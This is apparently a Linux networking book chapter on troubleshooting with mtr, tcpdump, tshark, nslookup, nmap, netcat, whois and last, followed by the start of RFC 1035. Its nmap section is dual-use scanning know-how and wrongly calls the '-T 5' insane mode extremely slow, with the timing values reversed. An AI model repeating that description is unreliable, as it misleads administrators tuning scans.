    The target server doesn't exist on the network. It could be disconnected or turned off. (!H or !N messages might be produced.)
    The network on which you expect the target host to reside doesn't exist in the routing table of one of the routers in the path. (!H or !N messages might be produced.)
    You may have a typographical error in the IP address of the target server
    You may have a routing loop in which packets bounce between two routers and never get to the intended destination.
    The packets don't have a proper return path to your server. The last visible hop being the last hop in which the packets return correctly. The router immediately after the last visible one is the one at which the routing changes. It's usually good to do the following:
        Log on to the last visible router.
        Look at the routing table to determine what the next hop is to your intended traceroute target.
        Log on to this next hop router.
        Do a traceroute from this router to your intended target server.
        If this works: Routing to the target server is OK. Do a traceroute back to your source server. The traceroute will probably fail at the bad router on the return path.
        If it doesn't work: Test the routing table and/or other status of all the hops between it and your intended target. 

Note: If there is nothing blocking your traceroute traffic, then the last visible router of an incomplete trace is either the last good router on the path, or the last router that has a valid return path to the server issuing the traceroute.
	10.2.18.10 Using MTR To Detect Network Congestion

Matt's Traceoute is an application you can use to do a repeated traceroute in real time; it dynamically shows the round-trip time to reach each hop along the traceroute path. The constant updates enable you not only to visually determine which hops are slow, but also to determine when they appear to be slow. It is a good tool to use whenever you suspect there is some intermittent network congestion.

You type in the word mtr followed by the target IP address to get output similar to the following:

[root@bigboy tmp]# mtr 192.168.25.26

                   Matt's traceroute  [v0.52]

Bigboy                                            Fri Feb 20 17:19:17 2004
Keys:  D - Display mode    R - Restart statistics    Q - Quit
                                      Packets               Pings
| Hostname                           %Loss  Rcv  Snt  Last Best  Avg  Worst
|   1. 192.168.1.1                       0%    17   17    32   10   15     32
|   2. 192.168.2.254                     0%    17   17    12   11   18     41
|   3. 192.168.3.15                      0%    17   17    23   14   18     25
|   4. 192.168.18.35                     0%    16   16    24   23   29     42
|   5. 192.168.25.26                     0%    16   16    23   21   26     37
[root@bigboy tmp]#


One of the nice features of MTR is that it gives you the best, worst and average roundtrip times in milliseconds for the probe packets between each hop along the way to the final destination. The advantage of this is that you can let MTR run for an extended period of time, acting as a constant monitor of communication path quality. The constant refreshing of the screen also enables you to instantaneously spot transient changes in quality fairly easily, making it much more convenient than a regular traceroute.

MTR is automatically installed as part of Fedora Linux. If MTR isn't installed on your system, you can download the RPM software installation package from many of the Fedora download sites. The installation of RPMs is covered in Chapter 6, "Installing Linux Software". There is even a free Windows version called WinMTR.

	10.2.18.11 Viewing Packet Flows with tcpdump

The tcpdump command is one of the most popular packages for viewing the flow of packets through your Linux box's NIC card. It is installed by default on RedHat/Fedora Linux and has very simple syntax, especially if you are doing simpler types of troubleshooting.

One of the most common uses of tcpdump is to determine whether you are getting basic two-way communication. Lack of communication could be due to the following:

    Bad routing
    Faulty cables, interfaces of devices in the packet flow
    The server not listening on the port because the software isn't installed or started
    A network device in the packet path is blocking traffic; common culprits are firewalls, routers with access control lists and even your Linux box running iptables. 

Analyzing tcpdump in much greater detail is beyond the scope of this section.

Like most Linux commands, tcpdump uses command-line switches to modify the output. Some of the more useful command-line switches are listed in Table 4-2.


Table 4-2 : Possible TCPdump Switches
tcpdump command switch 	Description

-c

	Stop after viewing count packets.

-i

	Listen on interface. If this is not specified, then the command will use the lowest numbered interface that is UP

-w

	Dump the output to a specially formatted TCPdump dump file

-C

	Specifies the size the dump file must reach before a new one with a numeric extension is created.

-t

	Don't print a timestamp at the beginning of each line

You can also add expressions after all the command-line switches. These act as filters to limit the volume of data presented on the screen. You can also use keywords such as and or or between expressions to further fine-tune your selection criteria. Some useful expressions are listed in Table 4-3.
Table 4-3 : Useful tcpdump Expressions
tcpdump command expression 	Description
host host-address 	View packets from the IP address host-address
icmp 	View icmp packets
tcp port port-number 	View TCP packets with packets with either a source or destination TCP port of port-number
udp port port-number 	View UDP packets with either a source or destination UDP port of port-number

The following is an example of tcpdump being used to view ICMP ping packets going through interface wlan0:

[root@bigboy tmp]# tcpdump -i wlan0 icmp
tcpdump: listening on wlan0
21:48:58.927091 smallfry > bigboy.my-site.com: icmp: echo request (DF)
21:48:58.927510 bigboy.my-site.com > smallfry: icmp: echo reply
21:48:58.928257 smallfry > bigboy.my-site.com: icmp: echo request (DF)
21:48:58.928365 bigboy.my-site.com > smallfry: icmp: echo reply
21:48:58.943926 smallfry > bigboy.my-site.com: icmp: echo request (DF)
21:48:58.944034 bigboy.my-site.com > smallfry: icmp: echo reply
21:48:58.962244 bigboy.my-site.com > smallfry: icmp: echo reply
21:48:58.963966 bigboy.my-site.com > smallfry: icmp: echo reply
21:48:58.968556 bigboy.my-site.com > smallfry: icmp: echo reply 

9 packets received by filter
0 packets dropped by kernel
[root@bigboy tmp]# 

In this example:

    The first column of data is a packet timestamp.
    The second column of data shows the packet source and then the destination IP address or server name of the packet.
    The third column shows the packet type.
    Two-way communication is occurring as each echo gets an echo reply. 

The following example shows tcpdump being used to view packets on interface wlan0 to/from host 192.168.1.102 on TCP port 22 with no timestamps in the output (-t switch).

[root@bigboy tmp]# tcpdump -i wlan0 -t host 192.168.1.102 and tcp port 22

tcpdump: listening on wlan0
smallfry.32938 > bigboy.my-site.com.ssh: S 2013297020:2013297020(0) win 5840 <mss    1460,sackOK,timestamp 75227931 0,nop,wscale 0> (DF) [tos 0x10]
bigboy.my-site.com.ssh > smallfry.32938: R 0:0(0) ack 2013297021 win 0 (DF) [tos 0x10] 
smallfry.32938 > bigboy.my-site.com.ssh: S 2013297020:2013297020(0) win 5840 <mss  1460,sackOK,timestamp 75227931 0,nop,wscale 0> (DF) [tos 0x10] 
bigboy.my-site.com.ssh > smallfry.32938: R 0:0(0) ack 1 win 0 (DF) [tos 0x10] 
smallfry.32938 > bigboy.my-site.com.ssh: S 2013297020:2013297020(0) win 5840 <mss 1460,sackOK,timestamp 75227931 0,nop,wscale 0> (DF) [tos 0x10] 
7 packets received by filter
0 packets dropped by kernel
[root@bigboy tmp]# 

In this example:

    The first column of data shows the packet source and then the destination IP address or server name of the packet
    The second column shows the TCP flags within the packet
    The client named bigboy is using port 32938 to communicate with the server named smallfry on the TCP SSH port 22.
    Two way communication is occurring 

Analyzing tcpdump files

By using the -w filename option you can send the entire Ethernet frame, not just a brief IP information that normally goes to the screen, to a file. This can then be analyzed by graphical analysis tools such as Wireshark, which is available in both Windows and Linux, with customized filters, colorization of packet records based on criteria deemed interesting, and the capability of automatically highlighting certain error conditions such as data retransmissions:

tcpdump -i eth1 -w /tmp/packets.dump tcp port 22

Covering Wireshark is beyond the scope of this book but that shouldn't discourage you from using it. The application is part of the Fedora RPM suite, and a Windows version is also available.
Common Problems with tcpdump

By default tcpdump will attempt to determine the DNS names of all the IP addresses it sees while logging data. This can slow down tcpdump so much that it appears not to be working at all. The -n switch stops DNS name lookups and will make tcpdump work more reliably.

The following are examples of how the -n switch affects the output:

Without the -n switch

[root@bigboy tmp]# tcpdump -i eth1 tcp port 22
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 96 bytes
02:24:34.818398 IP 192-168-1-242.my-site.com.1753 > bigboy-100.my-site.com.ssh: . ack 318574223 win 65471
02:24:34.818478 IP bigboy-100.my-site.com.ssh > 192-168-1-242.my-site.com.1753: P 1:165(164) ack 0 win 6432
02:24:35.019042 IP 192-168-1-242.my-site.com.1753 > bigboy-100.my-site.com.ssh: . ack 165 win 65307
02:24:35.019118 IP bigboy-100.my-site.com.ssh > 192-168-1-242.my-site.com.1753: P 165:401(236) ack 0 win 6432
02:24:35.176299 IP 192-168-1-242.my-site.com.1753 > bigboy-100.my-site.com.ssh: P 0:20(20) ack 401 win 65071
02:24:35.176337 IP bigboy-100.my-site.com.ssh > 192-168-1-242.my-site.com.1753: P 401:629(228) ack 20 win 6432

6 packets captured
7 packets received by filter
0 packets dropped by kernel
[root@bigboy tmp]#


With the -n switch


[root@bigboy tmp]# tcpdump -i eth1 -n tcp port 22
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 96 bytes
02:25:53.068511 IP 192.168.1.242.1753 > 192.168.1.100.ssh: . ack 318576011 win 65163
02:25:53.068606 IP 192.168.1.100.ssh > 192.168.1.242.1753: P 1:165(164) ack 0 win 6432
02:25:53.269152 IP 192.168.1.242.1753 > 192.168.1.100.ssh: . ack 165 win 64999
02:25:53.269205 IP 192.168.1.100.ssh > 192.168.1.242.1753: P 165:353(188) ack 0 win 6432
02:25:53.408556 IP 192.168.1.242.1753 > 192.168.1.100.ssh: P 0:20(20) ack 353 win 64811
02:25:53.408589 IP 192.168.1.100.ssh > 192.168.1.242.1753: P 353:541(188) ack 20 win 6432

6 packets captured
7 packets received by filter
0 packets dropped by kernel
[root@bigboy tmp]#

	10.2.18.12 Viewing Packet Flows with tshark

The tshark program is of the Fedora Linux wireshark RPM. It used to be called tethereal and came as part of the tethereal package, and many texts refer to it by its old name.

The tshark command-line options and screen output mimic that of tcpdump in many ways but tshark has a number of advantages.

The tshark command has the ability of dumping data to a file like tcpdump and creating new files with new filename extensions when a size limit has been reached. It can additionally limit the total number of files created before overwriting the first one in the queue, which is also known as a ring buffer.

The tshark screen output is also more intuitive to read, though the dump file format is identical to tcpdump.

Table 4-4 and Table 4-5 show some popular command switches and expressions that can be used with tshark.


Table 4-4 : Possible tshark Switches
tshark command switch 	Description

-c

	Stop after viewing count packets.

-i

	Listen on interface. If this is not specified, then the command will use the lowest numbered interface that is UP

-w

	Dump the output to a specially formatted TCPdump dump file

-C

	Specifies the size the dump file must reach before a new one with a numeric extension is created.

-b

	The size of the ring buffer when the -C switch is selected.
Table 4-5 : Useful tshark Expressions
tshark command expression 	Description
host host-address 	View packets from the IP address host-address
icmp 	View icmp packets
tcp port port-number 	View TCP packets with packets with either a source or destination TCP port of port-number
udp port port-number 	View UDP packets with either a source or destination UDP port of port-number

In the next example we're trying to observe an HTTP (TCP port 80) packet flow between server smallfry at address 192.168.1.102 and bigboy at IP address 192.168.1.100. The tshark output groups the IP addresses and TCP ports together and then provides the TCP flags, followed by the sequence numbering. It may not be apparent on this page, but the formatting lines up in neat columns on your screen, making analysis much easier. Also notice how the command line mimics that of tcpdump.

[root@smallfry tmp]# tshark -i eth0 tcp port 80 and host 192.168.1.100
Capturing on eth0
|   0.000000 192.168.1.102 -> 192.168.1.100 TCP 1442 > http [SYN] Seq=3325831828 Ack=0 Win=5840 Len=0
|   0.000157 192.168.1.100 -> 192.168.1.102 TCP http > 1442 [SYN, ACK] Seq=3291904936 Ack=3325831829 Win=5792 Len=0
|   0.000223 192.168.1.102 -> 192.168.1.100 TCP 1442 > http [ACK] Seq=3325831829 Ack=3291904937 Win=5840 Len=0
|   2.602804 192.168.1.102 -> 192.168.1.100 TCP 1442 > http [FIN, ACK] Seq=3325831829 Ack=3291904937 Win=5840 Len=0
|   2.603211 192.168.1.100 -> 192.168.1.102 TCP http > 1442 [ACK] Seq=3291904937 Ack=3325831830 Win=46 Len=0
|   2.603356 192.168.1.100 -> 192.168.1.102 TCP http > 1442 [FIN, ACK] Seq=3291904937 Ack=3325831830 Win=46 Len=0
|   2.603398 192.168.1.102 -> 192.168.1.100 TCP 1442 > http [ACK] Seq=3325831830 Ack=3291904938 Win=5840 Len=0
[root@smallfry tmp]#

Covering Wireshark is beyond the scope of this book but that shouldn't discourage you from using it. The application is part of the Fedora RPM suite and a Windows version is also available.

	10.2.18.13 Basic DNS Troubleshooting

Sometimes the source of problems can be due to misconfigured DNS rather than poor network connectivity. As mentioned before, DNS is the system that helps map an IP address to your Web site's domain name and your site may suddenly become unavailable if the mapping is incorrect.


Using nslookup to Test DNS

The nslookup command can be used to get the associated IP address for your domain and vice versa. The nslookup command is very easy to use; you just need to type the command followed by the IP address or Web site name you want to query.

The command actually queries your DNS server for a response, which is then displayed on the screen. Failures can be caused by your server not having the correct value set in the /etc/resolv.conf file as explained in Chapter 18, "Configuring DNS", poor connectivity to your DNS server, or an incorrect configuration on the DNS server.
Using nslookup to Check Your Web site Name

Here we see nslookup returning the IP address 216.151.193.92 for the site www.linuxhomenetworking.com.

[root@bigboy tmp]# nslookup www.linuxhomenetworking.com
...
...
Name:   www.linuxhomenetworking.com
Address: 216.151.193.92

[root@bigboy tmp]#

Using nslookup To Check Your IP Address

The nslookup command can operate in the opposite way in which a query against the address 216.151.193.92 returns the Web site named www.linuxhomenetworking.com:

[root@bigboy tmp]# nslookup 216.151.193.92
...
...
Non-authoritative answer:
| 92.193.151.216.in-addr.arpa     name = extra193-92.myisp.net.
|  
| Authoritative answers can be found from:
| 193.151.216.in-addr.arpa        nameserver = dns1.myisp.net.
| 193.151.216.in-addr.arpa        nameserver = dns2.myisp.net.
dns1.myisp.net   internet address = 216.151.192.1

[root@bigboy tmp]#

Using nslookup to Query a Specific DNS Server

Sometimes you might want to test the DNS mapping against a specific DNS server, this can be achieved by adding the DNS server's IP address immediately after the IP address of the Web site name you intend to query.

[root@bigboy tmp]# nslookup www.linuxhomenetworking.com 68.87.96.3
...
...
Server:         68.87.96.3
Address:        68.87.96.3#53
 
Name:   www.linuxhomenetworking.com
Address: 216.151.193.92
 
[root@bigboy tmp]#

Note: The nslookup command will probably be removed from future releases of Linux, but can still be used with Windows. The Linux host command can be used as a good replacement.


Using the host Command to Test DNS

More recent versions of Linux have started to use the host command for basic DNS testing. Fortunately syntax is identical to that of nslookup and the resulting output is very similar.

[root@bigboy tmp]# host 216.151.193.92
| 92.193.151.216.in-addr.arpa domain name pointer extra193-92.myisp.net.
[root@bigboy tmp]#

[root@bigboy tmp]# host www.linuxhomenetworking.com
www.linuxhomenetworking.com has address 216.151.193.92
[root@bigboy tmp]#

[root@zippy root]# host www.linuxhomenetworking.com 68.87.96.3
Using domain server:
Name: 68.87.96.3
Address: 68.87.96.3#53
Aliases:

www.linuxhomenetworking.com has address 65.115.71.34
[root@zippy root]#

	10.2.18.14 Using nmap

You can use nmap to determine all the TCP/IP ports on which a remote server is listening. It isn't usually an important tool in the home environment, but it can be used in a corporate environment to detect vulnerabilities in your network, such as servers running unauthorized network applications. It is a favorite tool of malicious surfers and therefore should be used to test external as well as internal servers under your control.

Whenever you are in doubt, you can get a list of available nmap options by just entering the command without arguments at the command prompt.

[root@bigboy tmp]# nmap

Nmap V. 3.00 Usage: nmap [Scan Type(s)] [Options] <host or net list>
Some Common Scan Types ('*' options require root privileges)
* -sS TCP SYN stealth port scan (default if privileged (root))
  -sT TCP connect() port scan (default for unprivileged users)
* -sU UDP port scan
  -sP ping scan (Find any reachable machines)
...
...
[root@bigboy tmp]#

Some of the more common nmap options are listed in Table 4-6, but you should also refer to the nmap man pages for full descriptions of them all.


Table 4-6 Commonly Used NMAP Options
Argument 	Description

-P0

	Nmap first attempts to ping a host before scanning it. If the server is being protected from ping queries, then you can use this option to force it to scan anyway.

-T

	Defines the timing between the packets set during a port scan. Some firewalls can detect the arrival of too many non-standard packets within a predetermined time frame. This option can be used to send them from 60 seconds apart with a value of "5" also known as insane mode to 0.3 seconds with a value of "0" in paranoid mode.

-O

	This will try to detect the operating system of the remote server based on known responses to various types of packets.

-p

	Lists the TCP/IP port range to scan.

-s

	Defines a variety of scan methods that use either packets that comply with the TCP/IP standard or are in violation of it.

Here is an example of us trying to do a scan using valid TCP connections (-sT) in the extremely slow "insane" mode (-T 5) from ports 1 to 5000.

[root@bigboy tmp]# nmap -sT -T 5 -p 1-5000 192.168.1.153
  
Starting nmap V. 3.00 ( www.insecure.org/nmap/ )
Interesting ports on whoknows.my-site-int.com (192.168.1.153):
(The 4981 ports scanned but not shown below are in state: closed)
Port       State       Service
21/tcp     open        ftp
25/tcp     open        smtp
139/tcp    open        netbios-ssn
199/tcp    open        smux
2105/tcp   open        eklogin
2301/tcp   open        compaqdiag
3300/tcp   open        unknown
 
Nmap run completed -- 1 IP address (1 host up) scanned in 8 seconds
[root@bigboy tmp]#

Full coverage of the possibilities on nmap as a security scanning tool are beyond the scope of this book, but you should go the extra mile and purchase a text specifically on Linux security to help protect you against attempts at malicious security breaches.
	10.2.18.15 Using netcat to Test Network Bandwidth

Most Linux distributions contain the netcat or nc packages which can be used to create a TCP socket over which you can transfer data. The syntax can also vary between distributions so you should refer to your system's man pages if you have any questions.

The netcat server can be easily created with the -l switch that signifies the program should listen, and not talk. The desired TCP port then follows. In this case the server is listening on TCP port 7777.

[root@smallfry tmp]# nc -l 7777

The netcat client only needs to specify the server's IP address followed by server's the TCP listener port.

[root@bigboy ~]# nc 192.168.2.50 7777

Any text typed to the console screen of the client;

[root@bigboy ~]# nc 192.168.2.50 7777
This is a test of the NetCat program!
[root@bigboy ~]#

will also be visible on the server's console.

[root@smallfry tmp]# nc -l 7777
This is a test of the NetCat program!
[root@smallfry tmp]#

If you want to transfer a file, you only need to use some simple command line redirection. In this case, the server will output all data it receives on port 7777 to a file called FC-6-i386-disc1.iso, and the client pipes the output of the cat command to the netcat client that points to our server.

[root@smallfry tmp]# nc -l 7777 > FC-6-i386-disc1.iso

[root@bigboy ~]# cat /tmp/FC-6-i386-disc1.iso | nc 192.168.2.50 7777

All Linux systems have a black hole file named /dev/null which automatically discards any data written to it. If you want to test file transfers without filling your disk storage, or having the server's disk I/O be a bottleneck, then use this as your output file instead.

[root@smallfry tmp]# nc -l 7777 > /dev/null

All Linux systems also have a have a continuous random data source located at /dev/random. Instead of using a file in your tests, you can use this instead for a data stream or infinite duration.

[root@bigboy ~]# cat /dev/random | nc 192.168.2.50 7777

The netcat program is a good bandwidth tester as it can dominate the capacity of your NIC. Unfortunately, it doesn't provide data transfer statistics, you will have to use some other tool such as MRTG, covered in Chapter 22 " Monitoring Server Performance", to give that information.
	10.2.18.16 Determining the Source of an Attack

Sometimes you realize that your system is under a denial-of-service type attack. This could be either malicious or simply someone rapidly downloading all the pages of your Web site with the Linux wget command. Symptoms include a large numbers of established connections when viewed with the netstat command or an excessive number of entries in your firewall or Web server logs.

Sometimes the attack isn't in the form of a constant bombardment that your server can't handle, but of the type that you can't handle, such as e-mail SPAM. ISPs are usually very sensitive to complaints about SPAM, but though you may have the IP address, a traceroute won't provide any contact information for the ISP.

Sometimes DNS lookups aren't enough to determine who owns an offending IP address. You need another tool.

One of the better ones to use is the whois command. Use it with an IP address or DNS domain as its sole argument and it will provide you with all the administrative information you need to start your hunt. Here is an example for the yahoo.com domain:


[root@bigboy tmp]# whois yahoo.com
...
...
    Administrative Contact:
        Domain Administrator
        (NIC-1382062)
        Yahoo! Inc.
        701 First Avenue
        Sunnyvale
        CA
        94089
        US
        domainadmin@yahoo-inc.com
        +1.4083493300
        Fax- +1.4083493301
...
...
[root@bigboy tmp]#

	10.2.18.17 Who Has Used My System?

It is always important to know who has logged into your Linux box. This isn't just to help track the activities of malicious users, but mostly to figure out who made the mistake that crashed the system or blew up Apache with a typographical error in the httpd.conf file.


The last Command

The most common command to determine who has logged into your system is last which lists the last users who logged into the system. Here are some examples:

[root@bigboy tmp]# last -100
root     pts/0        reggae.my-site.co Thu Jun 19 09:26   still logged in
root     pts/0        reggae.my-site.co Wed Jun 18 01:07 - 09:26 (1+08:18)
reboot   system boot   2.4.18-14         Wed Jun 18 01:07         (1+08:21)
root     pts/0        reggae.my-site.co Tue Jun 17 21:57 - down   (03:07)
root     pts/0        reggae.my-site.co Mon Jun 16 07:24 - 00:35  (17:10)
wtmp begins Sun Jun 15 16:29:18 2003
[root@bigboy tmp]#

In this example someone from reggae.my-site.com logged into bigboy as user root. I generally prefer not to give out the root password and let all the systems administrators log in with their own individual logins. They can then get root privileges by using sudo. This makes it easier to track down individuals rather than groups of users.


The who Command

The who command is used to see who is currently logged in to your computer. Here we see a user logged as root from server reggae.my-site.com.

[root@bigboy tmp]# who
root     pts/0        Jun 19 09:26 (reggae.my-site.com)
[root@bigboy tmp]#

	10.2.18.18 Conclusion

One of the greatest sources of frustration for any systems administrator is to try to isolate whether poor server performance is due to a network issue or problems with an application or database. The worry can be amplified especially as network instability is often under the control of network engineers who need evidence pointing to problems in their domain of expertise before they will be convinced to act.

These tips should help provide you with a definitive answer by enabling you to isolate the source of most network problems and helping you make their resolution much faster.

The next chapter builds on this new knowledge and expands your troubleshooting skills to include the reading of Linux error log files to assist in the diagnosis of unexpected Linux application behavior. 

	10.3 RFCs

		10.3.1 http://tools.ietf.org/html/rfc1035  DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION
Network Working Group                                     P. Mockapetris
Request for Comments: 1035                                           ISI
                                                           November 1987
Obsoletes: RFCs 882, 883, 973

            DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION


10.3.1.1. STATUS OF THIS MEMO

This RFC describes the details of the domain system and protocol, and
assumes that the reader is familiar with the concepts discussed in a
companion RFC, "Domain Names - Concepts and Facilities" [RFC-1034].

The domain system is a mixture of functions and data types which are an
official protocol and functions and data types which are still
experimental.  Since the domain system is intentionally extensible, new
data types and experimental behavior should always be expected in parts
of the system beyond the official protocol.  The official protocol parts
include standard queries, responses and the Internet class RR data
formats (e.g., host addresses).  Since the previous RFC set, several
definitions have changed, so some previous definitions are obsolete.

Experimental or obsolete features are clearly marked in these RFCs, and
such information should be used with caution.

The reader is especially cautioned not to depend on the values which
appear in examples to be current or complete, since their purpose is
primarily pedagogical.  Distribution of this memo is unlimited.

                           Table of Contents

  10.3.1.1. STATUS OF THIS MEMO                                              1
  10.3.1.2. INTRODUCTION                                                     3
      10.3.1.2.1. Overview                                                   3
      10.3.1.2.2. Common configurations                                      4
      10.3.1.2.3. Conventions                                                7
          10.3.1.2.3.1. Preferred name syntax                                7
          10.3.1.2.3.2. Data Transmission Order                              8
          10.3.1.2.3.3. Character Case                                       9
          10.3.1.2.3.4. Size limits                                         10
  10.3.1.3. DOMAIN NAME SPACE AND RR DEFINITIONS                            10
      10.3.1.3.1. Name space definitions                                    10
      10.3.1.3.2. RR definitions                                            11
          10.3.1.3.2.1. Format                                              11
          10.3.1.3.2.2. TYPE values                                         12
          10.3.1.3.2.3. QTYPE values                                        12
          10.3.1.3.2.4. CLASS values                                        13



Mockapetris                                                     [Page 1]

RFC 1035        Domain Implementation and Specification    November 1987


          10.3.1.3.2.5. QCLASS values                                       13
      10.3.1.3.3. Standard RRs                                              13
          10.3.1.3.3.1. CNAME RDATA format                                  14
          10.3.1.3.3.2. HINFO RDATA format                                  14
          10.3.1.3.3.3. MB RDATA format (EXPERIMENTAL)                      14
          10.3.1.3.3.4. MD RDATA format (Obsolete)                          15
          10.3.1.3.3.5. MF RDATA format (Obsolete)                          15
          10.3.1.3.3.6. MG RDATA format (EXPERIMENTAL)                      16
          10.3.1.3.3.7. MINFO RDATA format (EXPERIMENTAL)                   16
          10.3.1.3.3.8. MR RDATA format (EXPERIMENTAL)                      17
          10.3.1.3.3.9. MX RDATA format                                     17
          10.3.1.3.3.10. NULL RDATA format (EXPERIMENTAL)                   17
          10.3.1.3.3.11. NS RDATA format                                    18
          10.3.1.3.3.12. PTR RDATA format                                   18
          10.3.1.3.3.13. SOA RDATA format                                   19
          10.3.1.3.3.14. TXT RDATA format                                   20
      10.3.1.3.4. ARPA Internet specific RRs                                20
          10.3.1.3.4.1. A RDATA format                                      20
          10.3.1.3.4.2. WKS RDATA format                                    21
      10.3.1.3.5. IN-ADDR.ARPA domain                                       22
      10.3.1.3.6. Defining new types, classes, and special namespaces       24
  10.3.1.4. MESSAGES                                                        25
      10.3.1.4.1. Format                                                    25
          10.3.1.4.1.1. Header section format                               26
          10.3.1.4.1.2. Question section format                             28
          10.3.1.4.1.3. Resource record format                              29
          10.3.1.4.1.4. Message compression                                 30
      10.3.1.4.2. Transport                                                 32
          10.3.1.4.2.1. UDP usage                                           32
          10.3.1.4.2.2. TCP usage                                           32
  10.3.1.5. MASTER FILES                                                    33
      10.3.1.5.1. Format                                                    33
      10.3.1.5.2. Use of master files to define zones                       35
      10.3.1.5.3. Master file example                                       36
  10.3.1.6. NAME SERVER IMPLEMENTATION                                      37
      10.3.1.6.1. Architecture                                              37
          10.3.1.6.1.1. Control                                             37
          10.3.1.6.1.2. Database                                            37
          10.3.1.6.1.3. Time                                                39
      10.3.1.6.2. Standard query processing                                 39
      10.3.1.6.3. Zone refresh and reload processing                        39
      10.3.1.6.4. Inverse queries (Optional)                                40
          10.3.1.6.4.1. The contents of inverse queries and responses       40
          10.3.1.6.4.2. Inverse query and response example                  41
          10.3.1.6.4.3. Inverse query processing                            42






Mockapetris                                                     [Page 2]

RFC 1035        Domain Implementation and Specification    November 1987


      10.3.1.6.5. Completion queries and responses                          42
  10.3.1.7. RESOLVER IMPLEMENTATION                                         43
      10.3.1.7.1. Transforming a user request into a query                  43
      10.3.1.7.2. Sending the queries                                       44
      10.3.1.7.3. Processing responses                                      46
      10.3.1.7.4. Using the cache                                           47
  10.3.1.8. MAIL SUPPORT                                                    47
      10.3.1.8.1. Mail exchange binding                                     48
      10.3.1.8.2. Mailbox binding (Experimental)                            48
  10.3.1.9. REFERENCES and BIBLIOGRAPHY                                     50
  Index                                                              54

10.3.1.2. INTRODUCTION

10.3.1.2.1. Overview

The goal of domain names is to provide a mechanism for naming resources
in such a way that the names are usable in different hosts, networks,
protocol families, internets, and administrative organizations.

From the user's point of view, domain names are useful as arguments to a
local agent, called a resolver, which retrieves information associated
with the domain name.  Thus a user might ask for the host address or
mail information associated with a particular domain name.  To enable
the user to request a particular type of information, an appropriate
query type is passed to the resolver with the domain name.  To the user,
the domain tree is a single information space; the resolver is
responsible for hiding the distribution of data among name servers from
the user.

From the resolver's point of view, the database that makes up the domain
space is distributed among various name servers.  Different parts of the
domain space are stored in different name servers, although a particular
data item will be stored redundantly in two or more name servers.  The
resolver starts with knowledge of at least one name server.  When the
resolver processes a user query it asks a known name server for the
information; in return, the resolver either receives the desired
information or a referral to another name server.  Using these
referrals, resolvers learn the identities and contents of other name
servers.  Resolvers are responsible for dealing with the distribution of
the domain space and dealing with the effects of name server failure by
consulting redundant databases in other servers.

Name servers manage two kinds of data.  The first kind of data held in
sets called zones; each zone is the complete database for a particular
"pruned" subtree of the domain space.  This data is called
authoritative.  A name server periodically checks to make sure that its
zones are up to date, and if not, obtains a new copy of updated zones



Mockapetris                                                     [Page 3]

RFC 1035        Domain Implementation and Specification    November 1987


from master files stored locally or in another name server.  The second
kind of data is cached data which was acquired by a local resolver.
This data may be incomplete, but improves the performance of the
retrieval process when non-local data is repeatedly accessed.  Cached
data is eventually discarded by a timeout mechanism.

This functional structure isolates the problems of user interface,
failure recovery, and distribution in the resolvers and isolates the
database update and refresh problems in the name servers.

10.3.1.2.2. Common configurations

A host can participate in the domain name system in a number of ways,
depending on whether the host runs programs that retrieve information
from the domain system, name servers that answer queries from other
hosts, or various combinations of both functions.  The simplest, and
perhaps most typical, configuration is shown below:

                 Local Host                        |  Foreign
                                                   |
    +---------+               +----------+         |  +--------+
    |         | user queries  |          |queries  |  |        |
    |  User   |-------------->|          |---------|->|Foreign |
    | Program |               | Resolver |         |  |  Name  |
    |         |<--------------|          |<--------|--| Server |
    |         | user responses|          |responses|  |        |
    +---------+               +----------+         |  +--------+
                                |     A            |
                cache additions |     | references |
                                V     |            |
                              +----------+         |
                              |  cache   |         |
                              +----------+         |

User programs interact with the domain name space through resolvers; the
format of user queries and user responses is specific to the host and
its operating system.  User queries will typically be operating system
calls, and the resolver and its cache will be part of the host operating
system.  Less capable hosts may choose to implement the resolver as a
subroutine to be linked in with every program that needs its services.
Resolvers answer user queries with information they acquire via queries
to foreign name servers and the local cache.

Note that the resolver may have to make several queries to several
different foreign name servers to answer a particular user query, and
hence the resolution of a user query may involve several network
accesses and an arbitrary amount of time.  The queries to foreign name
servers and the corresponding responses have a standard format described



Mockapetris                                                     [Page 4]

RFC 1035        Domain Implementation and Specification    November 1987


in this memo, and may be datagrams.

Depending on its capabilities, a name server could be a stand alone
program on a dedicated machine or a process or processes on a large
timeshared host.  A simple configuration might be:

                 Local Host                        |  Foreign
                                                   |
      +---------+                                  |
     /         /|                                  |
    +---------+ |             +----------+         |  +--------+
    |         | |             |          |responses|  |        |
    |         | |             |   Name   |---------|->|Foreign |
    |  Master |-------------->|  Server  |         |  |Resolver|
    |  files  | |             |          |<--------|--|        |
    |         |/              |          | queries |  +--------+
    +---------+               +----------+         |

Here a primary name server acquires information about one or more zones
by reading master files from its local file system, and answers queries
about those zones that arrive from foreign resolvers.

The DNS requires that all zones be redundantly supported by more than
one name server.  Designated secondary servers can acquire zones and
check for updates from the primary server using the zone transfer
protocol of the DNS.  This configuration is shown below:

                 Local Host                        |  Foreign
                                                   |
      +---------+                                  |
     /         /|                                  |
    +---------+ |             +----------+         |  +--------+
    |         | |             |          |responses|  |        |
    |         | |             |   Name   |---------|->|Foreign |
    |  Master |-------------->|  Server  |         |  |Resolver|
    |  files  | |             |          |<--------|--|        |
    |         |/              |          | queries |  +--------+
    +---------+               +----------+         |
                                A     |maintenance |  +--------+
                                |     +------------|->|        |
                                |      queries     |  |Foreign |
                                |                  |  |  Name  |
                                +------------------|--| Server |
                             maintenance responses |  +--------+

In this configuration, the name server periodically establishes a
virtual circuit to a foreign name server to acquire a copy of a zone or
to check that an existing copy has not changed.  The messages sent for



Mockapetris                                                     [Page 5]

RFC 1035        Domain Implementation and Specification    November 1987


these maintenance activities follow the same form as queries and
responses, but the message sequences are somewhat different.

The information flow in a host that supports all aspects of the domain
name system is shown below:

                 Local Host                        |  Foreign
                                                   |
    +---------+               +----------+         |  +--------+
    |         | user queries  |          |queries  |  |        |
    |  User   |-------------->|          |---------|->|Foreign |
    | Program |               | Resolver |         |  |  Name  |
    |         |<--------------|          |<--------|--| Server |
    |         | user responses|          |responses|  |        |
    +---------+               +----------+         |  +--------+
                                |     A            |
                cache additions |     | references |
                                V     |            |
                              +----------+         |
                              |  Shared  |         |
                              | database |         |
                              +----------+         |
                                A     |            |
      +---------+     refreshes |     | references |
     /         /|               |     V            |
